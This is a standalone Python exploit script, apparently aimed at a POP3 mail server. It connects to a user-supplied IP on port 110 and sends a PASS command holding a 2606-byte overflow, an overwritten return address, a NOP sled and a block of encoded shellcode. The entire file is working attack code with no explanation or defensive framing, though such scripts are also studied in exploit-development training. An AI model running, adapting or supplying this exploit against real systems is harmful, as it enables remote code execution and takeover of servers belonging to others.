from socket import socket, AF_INET, SOCK_STREAM
SHELL_CODE: str = (
	"\xd9\xc3\xd9\x74\x24\xf4\xba\xa4\x91\xf3\x3c\x5e\x29\xc9\xb1"
	"\x52\x83\xc6\x04\x31\x56\x13\x03\xf2\x82\x11\xc9\x06\x4c\x57"
	"\x32\xf6\x8d\x38\xba\x13\xbc\x78\xd8\x50\xef\x48\xaa\x34\x1c"
	"\x22\xfe\xac\x97\x46\xd7\xc3\x10\xec\x01\xea\xa1\x5d\x71\x6d"
	"\x22\x9c\xa6\x4d\x1b\x6f\xbb\x8c\x5c\x92\x36\xdc\x35\xd8\xe5"
	"\xf0\x32\x94\x35\x7b\x08\x38\x3e\x98\xd9\x3b\x6f\x0f\x51\x62"
	"\xaf\xae\xb6\x1e\xe6\xa8\xdb\x1b\xb0\x43\x2f\xd7\x43\x85\x61"
	"\x18\xef\xe8\x4d\xeb\xf1\x2d\x69\x14\x84\x47\x89\xa9\x9f\x9c"
	"\xf3\x75\x15\x06\x53\xfd\x8d\xe2\x65\xd2\x48\x61\x69\x9f\x1f"
	"\x2d\x6e\x1e\xf3\x46\x8a\xab\xf2\x88\x1a\xef\xd0\x0c\x46\xab"
	"\x79\x15\x22\x1a\x85\x45\x8d\xc3\x23\x0e\x20\x17\x5e\x4d\x2d"
	"\xd4\x53\x6d\xad\x72\xe3\x1e\x9f\xdd\x5f\x88\x93\x96\x79\x4f"
	"\xd3\x8c\x3e\xdf\x2a\x2f\x3f\xf6\xe8\x7b\x6f\x60\xd8\x03\xe4"
	"\x70\xe5\xd1\xab\x20\x49\x8a\x0b\x90\x29\x7a\xe4\xfa\xa5\xa5"
	"\x14\x05\x6c\xce\xbf\xfc\xe7\xfb\x34\xfe\x81\x93\x48\xfe\x6c"
	"\xdf\xc4\x18\x04\x0f\x81\xb3\xb1\xb6\x88\x4f\x23\x36\x07\x2a"
	"\x63\xbc\xa4\xcb\x2a\x35\xc0\xdf\xdb\xb5\x9f\xbd\x4a\xc9\x35"
	"\xa9\x11\x58\xd2\x29\x5f\x41\x4d\x7e\x08\xb7\x84\xea\xa4\xee"
	"\x3e\x08\x35\x76\x78\x88\xe2\x4b\x87\x11\x66\xf7\xa3\x01\xbe"
	"\xf8\xef\x75\x6e\xaf\xb9\x23\xc8\x19\x08\x9d\x82\xf6\xc2\x49"
	"\x52\x35\xd5\x0f\x5b\x10\xa3\xef\xea\xcd\xf2\x10\xc2\x99\xf2"
	"\x69\x3e\x3a\xfc\xa0\xfa\x4a\xb7\xe8\xab\xc2\x1e\x79\xee\x8e"
	"\xa0\x54\x2d\xb7\x22\x5c\xce\x4c\x3a\x15\xcb\x09\xfc\xc6\xa1"
	"\x02\x69\xe8\x16\x22\xb8"
)
BUFFER: str = 'A' * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 10 + SHELL_CODE


def create_connection(host: str) -> None:
	_socket = socket(AF_INET, SOCK_STREAM)
	_socket.connect((host, 110))
	_data = _socket.recv(1024)
	_socket.send('USER username\r\n')
	_data = _socket.recv(1024)
	_socket.send(f'PASS {BUFFER}\r\n')
	_socket.close()


def main() -> None:
	try:
		host = str(input('Enter host IP: '))
	except TypeError:
		print('Incorrect input, you enter')
		exit(1)
	try:
		print(f'start sending data to {host}')
		create_connection(host)
		print('Done')
	except:
		print(f'Connection error with {host}')


if __name__ == '__main__':
	main()
